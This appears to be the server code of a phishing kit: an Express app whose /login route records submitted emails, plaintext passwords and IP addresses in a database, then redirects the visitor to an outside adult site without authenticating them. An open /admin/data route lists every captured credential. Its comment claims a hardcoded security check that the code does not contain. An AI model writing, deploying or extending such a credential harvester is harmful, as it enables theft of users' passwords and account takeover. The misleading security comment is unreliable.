const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');
const db = require('./database');

const app = express();
const PORT = 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname)); // Serve static files from current directory

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

const crypto = require('crypto');

// Endpoint to log login attempts
app.post('/login', (req, res) => {
     const { email, password } = req.body;
    // Get IP address
    const ip_address = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const timestamp = new Date().toISOString();



    console.log(`Login attempt: ${email} from ${ip_address}`);

    const sql = `INSERT INTO logs (email, password, ip_address, timestamp) VALUES (?, ?, ?, ?)`;
    db.run(sql, [email, password, ip_address, timestamp], function (err) {
        if (err) {
            console.error('Error logging to DB:', err.message);
            return res.status(500).json({ error: 'Failed to log attempt' });
        }
        // Success
        res.json({ message: 'Logged successfully', redirectUrl: 'https://omg.adult' });
    });
});

// Admin endpoint to get logs (secured by basic hardcoded check for demonstration)
app.get('/admin/data', (req, res) => {
    const sql = `
        SELECT id, email, password, ip_address, timestamp
        FROM logs
        ORDER BY id DESC
    `;

    db.all(sql, [], (err, rows) => {
        if (err) {
            return res.status(500).json({ error: err.message });
        }
        res.json({ logs: rows });
    });
});


app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
